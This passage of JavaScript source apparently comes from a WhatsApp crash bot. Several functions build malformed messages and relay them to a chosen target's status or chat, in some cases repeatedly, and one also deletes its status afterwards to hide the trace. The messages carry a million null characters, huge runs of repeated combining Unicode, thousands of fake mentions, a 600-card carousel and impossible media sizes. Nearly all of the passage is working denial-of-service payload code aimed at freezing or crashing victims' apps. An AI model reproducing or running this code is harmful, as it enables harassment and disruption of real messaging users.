            newsletterJid: "12037205250208@newsletter",
            newsletterName: "ange Ama lu",
            serverMessageId: 1000,
            accessibilityText: "Just Me Alone мαηтα'χ"
          },
          statusAttributionType: "RESHARED_FROM_MENTION_MANY_TIMES",
          statusAttributions: [
            {
              type: "STATUS_MENTION",
              music: {
                authorName: "мαηтα'χ",
                songId: Math.random(),
                title: "Love u Ayun",
                author: "мαηтα'χ",
                artistAttribution: "t.me/Otapengenkawin",
                isExplicit: true
              }
            },
            {
              type: "GROUP_STATUS",
              music: {
                authorName: "мαηтα'χ",
                songId: Math.random(),
                title: "Love u Ayun",
                author: "мαηтα'χ",
                artistAttribution: "t.me/Otapengenkawin",
                isExplicit: true
              }
            }
          ]
        },
        body: {
          text: "мαηтα'χ",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `${"\u0000".repeat(1000000)}`,
          version: 3
        }
      }
    };

    let msg = generateWAMessageFromContent(target, ZxY, {});

    await otax.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });

    await sleep(1000);

    await otax.sendMessage('status@broadcast', {
      delete: msg.key
    })
  }
}
async function stIntx(otax, target) {
  let ZxY = {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "12037205250208@newsletter",
          newsletterName: "ange Ama lu",
          serverMessageId: 1000,
          accessibilityText: "Just Me Alone мαηтα'χ"
        },
        statusAttributionType: "RESHARED_FROM_MENTION_MANY_TIMES",
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: "мαηтα'χ",
              songId: Math.random(),
              title: "Love u Ayun",
              author: "мαηтα'χ",
              artistAttribution: "t.me/Otapengenkawin",
              isExplicit: true
            }
          },
          {
            type: "GROUP_STATUS",
            music: {
              authorName: "мαηтα'χ",
              songId: Math.random(),
              title: "Love u Ayun",
              author: "мαηтα'χ",
              artistAttribution: "t.me/Otapengenkawin",
              isExplicit: true
            }
          }
        ]
      },
      body: {
        text: "мαηтα'χ",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `${"ྃ".repeat(100000)}`,
        version: 3
      }
    }
  };

  let msg = generateWAMessageFromContent(target, ZxY, {});

  await otax.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id,
    statusJidList: [target]
  });

  await otax.sendMessage('status@broadcast', {
    delete: msg.key
  })
}

async function groupjir(otax, target) {
  const imageMessage = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 999,
    width: -999,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  }

  let cards = [];
  for (let z = 0; z < 600; z++) {
    cards.push({
      header: {
        imageMessage,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    })
  }
  const msgs = [
    {
      botInvokeMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/540088134_2387171995086564_7374737232099736764_n.enc?ccb=11-4&oh=01_Q5Aa3wHsB8VZwvNZZDAwprB9JUvHSPN-aK2xJ5e6pB8CT0rROA&oe=69C791C5&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "OnvYb+0Ss+wPFvD8Rl/17+YlXYDRifpw5f+jRE1Gsbg=",
            fileLength: 999999999999999,
            seconds: 999999,
            mediaKey: "RVY9RqvBDcgghvdeedlN5jTK3IsSLsFgqgkzej4e3X4=",
            caption: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
            height: 850,
            width: 478,
            fileEncSha256: "5zaKfVhEc73jJhA0A76c8pVmUlm2NnuVc3cnWce7RQc=",
            directPath: "/v/t62.7161-24/540088134_2387171995086564_7374737232099736764_n.enc?ccb=11-4&oh=01_Q5Aa3wHsB8VZwvNZZDAwprB9JUvHSPN-aK2xJ5e6pB8CT0rROA&oe=69C791C5&_nc_sid=5e03e0&_nc_hot=1772095746",
            mediaKeyTimestamp: "1772015271",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8xd08q1UTizoenMSK1a9WaMkNT3ZrFyc7nOmsY2rtlXZWZ3ooDzQNY6AaAP/xAAcEAADAAMBAQEAAAAAAAAAAAAAAQIDEBESEyD/2gAIAQEAAT8AyRwlDRS1lnp54UU9XRVlWd1ksqt9MjEunyfDyeRvpjJ5wySN6TJsp+j5tnToqFZjufyqaP/EABkRAAIDAQAAAAAAAAAAAAAAAAEQABEgAv/aAAgBAgEBPwBjA6dSzj//xAAaEQACAgMAAAAAAAAAAAAAAAABAhAgABEh/9oACAEDAQE/AJNCvJDZqn//2Q==",
            processedVideos: [
              {
                quality: "HIGH",
                capabilities: ["7eppeliTcore", "XzoneCatalyst", "PDFsCorp"]
              }
            ],
            gifAttribution: "GIPHY",
            contextInfo: {
              forwardingScore: 7205,
              isForwarded: true,
              pairedMediaType: "HEVC_VIDEO_CHILD",
              forwardOrigin: "UNKNOWN"
            },
            streamingSidecar: "fAMcYnkzkWykVy5Nr51RhzHwBRVBfXHYi5aR/XpP7X8b50/aNLQOKn6Q2Md1FSI0LOk2QW8sfmBSUdpYoPBeOhPFCeWjIKvK6pt7M5eEhKZYk2laDw3jpHKsW0fhQKTsluCFHJQr6oamjFtRs3MybkhXOMEm9osjbq83MBKgR+DqWqGGvic/xVFX5TvHX7saOSY5iCGVeJXlLU/ZZfxQkZO5zx7F3WVY6Y0oXI7bvz/YyT2hPYXRyKhp6SAgm9El6BvkLeYflYV3tlyzly+uMwJJq2nDUWBJYEc0ARR3F4WqpZnpjQJKTtwXl8sC4yHBS2hQFT1sLighApXV1mYEUNJFL9vNMu+9hvv6Irmd/+E4oAXnKB8mpy1scoBigBKlJYX7PrK58SUbN+qj/+WgwaZGVNeMpED2fR9wR8t5TuvXPJgnnEpwfCas",
            annotations: [
              {
                polygonVertices: [
                  {
                    x: 0.25,
                    y: 0.4155234396457672
                  },
                  {
                    x: 0.75,
                    y: 0.4155234396457672
                  },
                  {
                    x: 0.75,
                    y: 0.5836874842643738
                  },
                  {
                    x: 0.25,
                    y: 0.5836874842643738
                  }
                ],
                shouldSkipConfirmation: true,
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "806119065866333",
                    songId: "1137812656623908",
                    author: "ᩫᩫ".repeat(15000),
                    title: "ᩫᩫ".repeat(15000),
                    artworkDirectPath: "/v/t61.89441-24/595437186_731840673341902_1266462731933211674_n.enc?ccb=11-4&oh=01_Q5Aa3wGVOUtWMjbELz41CC6Hq7KB65m4UQ1Ok_J4Onvo7RgRZQ&oe=69C77E6D&_nc_sid=5e03e0",
                    artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
                    artworkEncSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
                    artistAttribution: "https://t.me/ZeppeliPdf",
                    countryBlocklist: "UlU=",
                    isExplicit: true,
                    artworkMediaKey: "",
                    musicSongStartTimeInMs: "7000",
                    derivedContentStartTimeInMs: "0",
                    overlapDurationInMs: "30000"
                  }
                },
                embeddedAction: true
              }
            ],
            metadataUrl: "https://mmg.whatsapp.net/channel/video?id=921729444087793"
          }
        }
      }
    },
    {
      requestPaymentMessage: {
        currencyCodeIso4217: "IDR",
        amount1000: "999999",
        noteMessage: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091",
          },
          expiryTimestamp: Date.now() + 86400000,
          background: null
        }
      }
    },
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "\0" },
            carouselMessage: {
              cards
            }
          }
        }
      }
    },
    {
      groupInviteMessage: {
        groupJid: "120359999999@g.us",
        groupName: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "ᩫᩫ".repeat(60000),
        caption: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
        inviteCode: crypto.randomBytes(3).toString('hex').toUpperCase(),
        inviteExpiration: Date.now() * 60000
      }
    }
  ]

  for (const msg of msgs) {
    await otax.relayMessage(target, msg, {})
  }
}

async function iozzz(otax, target) {
  let documentMessage = prepareWAMessageMedia(
    { document: { url: "./package-lock.json" } },
    { upload: otax.waUploadToServer }
  );
  documentMessage = documentMessage.documentMessage;
  documentMessage.caption = "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000);
  documentMessage.fileName = "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️";

  const msgs = [
    {
      locationMessage: {
        degreesLatitude: 0,
        degreesLongitude: 0,
        name: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000)
      }
    },
    {
      extendedTextMessage: {
        text: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(15000)
      }
    },
    {
      requestPhoneNumberMessage: {
        contextInfo: {
          externalAdReply: {
            title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ͡ 𝐞𝐥𝐢⃰͜ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000),
            body: "\0"
          }
        }
      }
    },
    {
      documentMessage
    }
  ];

  for (const msg of msgs) {
    await otax.relayMessage("status@broadcast", msg, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    })
  }
}

async function iosinVisFC3(otax, target) {
  const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
  const s = "𑇂𑆵𑆴𑆿".repeat(60000);
  try {
    let locationMessagex = {
      degreesLatitude: 11.11,
      degreesLongitude: -11.11,
      name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/MantaXX",
    }
    let msgx = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessagex
        }
      }
    }, {});
    let extendMsgx = {
      extendedTextMessage: {
        text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
        matchedText: "мαηтα'χ",
        description: "𑇂𑆵𑆴𑆿".repeat(60000),
        title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
        previewType: "NONE",
        jpegThumbnail: "",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msgx2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendMsgx
        }
      }
    }, {});
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }
    let msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});
    let extendMsg = {
      extendedTextMessage: {
        text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone,
        matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
        description: "𑇂𑆵𑆴𑆿".repeat(25000),
        title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msg2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendMsg
        }
      }
    }, {});
    let msg3 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});

    for (let i = 0; i < 10; i++) {
      await otax.relayMessage('status@broadcast', msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });

      await otax.relayMessage('status@broadcast', msg2.message, {
        messageId: msg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
      await otax.relayMessage('status@broadcast', msg.message, {
        messageId: msgx.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
      await otax.relayMessage('status@broadcast', msg2.message, {
        messageId: msgx2.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });

      await otax.relayMessage('status@broadcast', msg3.message, {
        messageId: msg3.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
      if (i < 9) {
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }
  } catch (err) {
    console.error(err);
  }
};
async function spamOfmm(otax, target) {
  await otax.relayMessage(
    "status@broadcast",
    {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
        fileLength: "275719",
        seconds: 15,
        mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
        height: -720,
        width: 720,
        fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
        directPath:
